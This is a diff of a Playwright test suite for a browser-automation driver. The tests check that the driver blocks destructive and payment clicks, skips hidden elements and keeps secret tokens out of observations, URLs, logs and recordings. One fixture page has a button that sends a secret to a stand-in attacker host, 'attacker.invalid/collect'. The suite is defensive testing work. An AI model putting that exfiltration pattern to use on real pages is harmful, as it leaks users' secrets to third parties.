@@ -29,8 +29,8 @@ describe("playwright behavioral driver", () => {
     const app = await serve(`<button id="set" onclick="localStorage.setItem('seen','yes')">Set</button><button id="read" onclick="document.body.dataset.seen=localStorage.getItem('seen')||'no'">Read</button>`);
     const driver = createPlaywrightDriver({ browserType: chromium });
     const dir = await tempDir();
-    const first = await driver.start(input("s1", app.url, path.join(dir, "s1"), { allowClick: true }));
-    const second = await driver.start(input("s2", app.url, path.join(dir, "s2"), { allowClick: true }));
+    const first = await driver.start(input("s1", app.url, path.join(dir, "s1"), { allowClick: true, allowStateMutation: true }));
+    const second = await driver.start(input("s2", app.url, path.join(dir, "s2"), { allowClick: true, allowStateMutation: true }));
 
     const firstObservation = await driver.observe(first);
     await driver.execute(first, { type: "click", elementId: firstObservation.semantic.interactiveElements.find((item) => item.name === "Set").id, reasonCode: "set_storage" });
@@ -50,7 +50,7 @@ describe("playwright behavioral driver", () => {
     const app = await serve(`<button style="display:none">Hidden Pay</button><button id="covered" style="position:absolute;left:20px;top:20px">Covered</button><div style="position:absolute;left:0;top:0;width:200px;height:100px;background:white">Overlay</div><button style="position:absolute;left:20px;top:140px">Safe</button>`);
     const driver = createPlaywrightDriver({ browserType: chromium });
     const dir = await tempDir();
-    const handle = await driver.start(input("hidden", app.url, dir, { allowClick: true }));
+    const handle = await driver.start(input("hidden", app.url, dir, { allowClick: true, allowStateMutation: true }));
     const observation = await driver.observe(handle);
     expect(observation.semantic.interactiveElements.map((item) => item.name)).toEqual(["Safe"]);
     expect(observation.semantic.interactiveElements[0]).not.toHaveProperty("selector");
@@ -69,7 +69,7 @@ describe("playwright behavioral driver", () => {
     const app = await serve(`<button onclick="location.href='https://attacker.invalid/collect?secret=abc'">Continue</button><button>Delete account</button>`);
     const driver = createPlaywrightDriver({ browserType: chromium });
     const dir = await tempDir();
-    const handle = await driver.start(input("safety", app.url, dir, { allowClick: true, stopBeforeConfirmation: true }));
+    const handle = await driver.start(input("safety", app.url, dir, { allowClick: true, allowStateMutation: true, stopBeforeConfirmation: true }));
     const observation = await driver.observe(handle);
     const del = await driver.execute(handle, { type: "click", elementId: observation.semantic.interactiveElements.find((item) => item.name === "Delete account").id, reasonCode: "confirm_delete" });
     expect(del).toMatchObject({ status: "blocked", message: "Destructive confirmation/payment action blocked" });
@@ -120,7 +120,7 @@ describe("playwright behavioral driver", () => {
     observation = await driver.observe(mutation);
     expect(await driver.execute(mutation, { type: "click", elementId: elementId(observation, "Submit form"), reasonCode: "submit" })).toMatchObject({ status: "blocked", message: "Form submission is blocked by policy" });
     observation = await driver.observe(mutation);
-    expect(await driver.execute(mutation, { type: "click", elementId: elementId(observation, "Mutate"), reasonCode: "mutate" })).toMatchObject({ status: "blocked", message: "State-mutating request is blocked by policy" });
+    expect(await driver.execute(mutation, { type: "click", elementId: elementId(observation, "Mutate"), reasonCode: "mutate" })).toMatchObject({ status: "blocked", message: "Scriptable control requires allowStateMutation" });
 
     const upload = await driver.start({ ...input("upload", app.url, path.join(dir, "upload"), { allowClick: true, allowNavigation: true, allowStateMutation: true, allowFileUpload: false }), environment });
     observation = await driver.observe(upload);
@@ -134,18 +134,24 @@ describe("playwright behavioral driver", () => {
 
   it("revalidates retained elements and excludes values and off-viewport semantics", async () => {
     if (!browserAvailable) return;
-    const app = await serve(`<h1>Visible heading</h1><input aria-label="API key" value="super-secret"><input type="checkbox" aria-label="Remember" checked><button id="swap">Continue</button><h2 style="position:absolute;top:2000px">Offscreen secret</h2><script>setTimeout(()=>swap.replaceWith(Object.assign(document.createElement('button'),{textContent:'Continue'})),150)</script>`);
+    const app = await serve(`<h1>Visible heading</h1><input aria-label="API key" value="super-secret"><input type="checkbox" aria-label="Remember" checked><button id="swap">Continue</button><h2 style="position:absolute;top:2000px">Offscreen secret</h2><script>console.error('super-secret');setTimeout(()=>swap.replaceWith(Object.assign(document.createElement('button'),{textContent:'Continue'})),150)</script>`);
     const driver = createPlaywrightDriver({ browserType: chromium });
     const dir = await tempDir();
-    const handle = await driver.start(input("toctou", app.url, dir, { allowClick: true }));
+    const handle = await driver.start({
+      ...input("toctou", `${app.url}?token=super-secret`, dir, { allowClick: true, allowStateMutation: true }),
+      valueRefs: { token: "super-secret" },
+      evidencePolicy: { screenshot: "every_action", trace: true, video: "all", semanticSnapshot: "every_action" },
+    });
     const observation = await driver.observe(handle);
     expect(JSON.stringify(observation.semantic)).not.toContain("super-secret");
     expect(JSON.stringify(observation.semantic)).not.toContain("Offscreen secret");
+    expect(observation.page.url).not.toContain("super-secret");
+    expect(JSON.stringify(observation.runtime)).not.toContain("super-secret");
     expect(observation.semantic.headings[0]).toMatchObject({ text: "Visible heading", viewportPosition: { inViewport: true } });
     expect(observation.semantic.interactiveElements.find((item) => item.name === "Remember")).toMatchObject({ checked: true });
     await new Promise((resolve) => setTimeout(resolve, 200));
     expect(await driver.execute(handle, { type: "click", elementId: elementId(observation, "Continue"), reasonCode: "continue" })).toMatchObject({ status: "blocked", message: "Observed element changed before action" });
-    await driver.close(handle);
+    expect((await driver.close(handle)).evidence.every((entry) => !["trace", "video"].includes(entry.type))).toBe(true);
     await app.close();
     cleanup.push(() => rm(dir, { recursive: true, force: true }));
   });
